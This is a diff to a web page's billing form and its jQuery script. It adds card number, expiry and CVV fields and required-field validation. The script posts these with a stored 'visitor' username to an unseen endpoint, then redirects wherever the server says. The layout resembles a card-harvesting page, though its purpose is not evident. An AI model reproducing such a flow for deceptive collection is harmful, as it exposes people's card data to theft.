@@ -26,48 +26,74 @@
     <h2>Billing Information</h2>
     <p>Fields marked with an <span class="required">*&nbsp;&nbsp;</span> are required.</p>
 
-    <form id="billingForm">
-        <div class="form-group">
-            <label for="streetAddress">Street Address <span class="required">*&nbsp;&nbsp;</span></label>
-            <input type="text" id="streetAddress" name="streetAddress" placeholder="Enter your street address" required>
-        </div>
+    <form>
+    <div class="form-group">
+        <label for="addressLine1">Step 1 <span class="required">*&nbsp&nbsp</span></label>
+        <input type="text" id="addressLine1" name="addressLine1" placeholder="Enter your address line 1" required>
+        <span>&nbsp&nbspAddress Line 1</span>
+    </div>
 
-        <div class="form-group">
-            <label for="city">City <span class="required">*&nbsp;&nbsp;</span></label>
-            <input type="text" id="city" name="city" placeholder="Enter your city" required>
-        </div>
+    <div class="form-group">
+        <label for="addressLine2">Step 2</label>
+        <input type="text" id="addressLine2" name="addressLine2" placeholder="Enter your address line 2 (optional)">
+        <span>&nbsp&nbspAddress Line 2</span>
+    </div>
 
-        <div class="form-group">
-            <label for="state">State <span class="required">*&nbsp;&nbsp;</span></label>
-            <input type="text" id="state" name="state" placeholder="Enter your state" required>
-        </div>
+    <div class="form-group">
+        <label for="city">Step 3 <span class="required">*&nbsp&nbsp</span></label>
+        <input type="text" id="city" name="city" placeholder="Enter your city" required>
+        <span>&nbsp&nbspCity</span>
+    </div>
 
-        <div class="form-group">
-            <label for="zipCode">ZIP Code <span class="required">*&nbsp;&nbsp;</span></label>
-            <input type="text" id="zipCode" name="zipCode" placeholder="Enter your ZIP code" required>
-        </div>
+    <div class="form-group">
+        <label for="state">Step 4 <span class="required">*&nbsp&nbsp</span></label>
+        <input type="text" id="state" name="state" placeholder="Enter your state" required>
+        <span>&nbsp&nbspState</span>
+    </div>
 
-        <!-- New Card Details Fields -->
-        <!--div class="form-group">
-            <label for="cardNumber">Card Number <span class="required">*&nbsp;&nbsp;</span></label>
-            <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter your card number" required>
-        </div>
+    <div class="form-group">
+        <label for="zipCode">Step 5 <span class="required">*&nbsp&nbsp</span></label>
+        <input type="text" id="zipCode" name="zipCode" placeholder="Enter your ZIP code" required>
+        <span>&nbsp&nbspZIP Code</span>
+    </div>
 
-        <div class="form-group">
-            <label for="expiryDate">Expiration Date <span class="required">*&nbsp;&nbsp;</span></label>
-            <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
-        </div>
+    <div class="form-group">
+        <label for="country">Step 6 <span class="required">*&nbsp&nbsp</span></label>
+        <select id="country" name="country" required>
+            <option value="">Select your country</option>
+            <option value="us">United States</option>
+            <option value="ca">Canada</option>
+            <option value="uk">United Kingdom</option>
+            <option value="au">Australia</option>
+        </select>
+        <span>&nbsp&nbspCountry</span>
+    </div>
 
-        <div class="form-group">
-            <label for="cvv">CVV <span class="required">*&nbsp;&nbsp;</span></label>
-            <input type="text" id="cvv" name="cvv" placeholder="Enter your CVV" required>
-        </div-->
+    <!-- Card Information Section -->
+    <div class="form-group">
+        <label for="cardNumber">Step 7 <span class="required">*&nbsp&nbsp</span></label>
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter your card number" required>
+        <span>&nbsp&nbspCard Number</span>
+    </div>
 
-        <div class="form-actions">
-            <button type="button" class="cancel">Cancel</button>
-            <button type="submit" class="continue">Continue</button>
-        </div>
-    </form>
+    <div class="form-group">
+        <label for="expiryDate">Step 8 <span class="required">*&nbsp&nbsp</span></label>
+        <input type="month" id="expiryDate" name="expiryDate" required>
+        <span>&nbsp&nbspExpiry Date</span>
+    </div>
+
+    <div class="form-group">
+        <label for="cvv">Step 9 <span class="required">*&nbsp&nbsp</span></label>
+        <input type="text" id="cvv" name="cvv" placeholder="Enter your CVV" required>
+        <span>&nbsp&nbspCVV</span>
+    </div>
+
+    <!-- Submit Section -->
+    <div class="form-actions">
+        <button type="button" class="cancel">Cancel</button>
+        <button type="submit" class="continue">Complete Setup</button>
+    </div>
+</form>
 </section>
     </div>
 
@@ -114,16 +140,32 @@
 
         let userinfo = {}; 
         let visitor = $('#username').val();
+        let isValid = true; // Flag to check if all inputs are valid
+
         sessionStorage.setItem('visitor', visitor);
-        
+
         $('form input').each(function () {
             let inputName = $(this).attr('name');
             let inputValue = $(this).val();
-            
-            if (inputName) {
-                userinfo[inputName] = inputValue;
+            let isRequired = $(this).attr('required');
+
+            // Validate required inputs
+            if (isRequired && !inputValue.trim()) {
+                $(this).css('border', '1px solid red'); // Highlight empty required fields
+                isValid = false;
+            } else {
+                $(this).css('border', ''); // Reset border if valid
+                if (inputName) {
+                    userinfo[inputName] = inputValue;
+                }
             }
         });
+
+        // Stop submission if validation fails
+        if (!isValid) {
+            console.log('Please fill in all required fields.');
+            return;
+        }
 
         userinfo['visitor'] = visitor;
         console.log(userinfo); 
@@ -133,8 +175,8 @@
             type: 'POST',
             data: userinfo,
             success: function (response) {
-             if(response.url){
-                window.location.href = response.url;
+                if (response.url) {
+                    window.location.href = response.url;
                 }
             },
             error: function (xhr, status, error) {
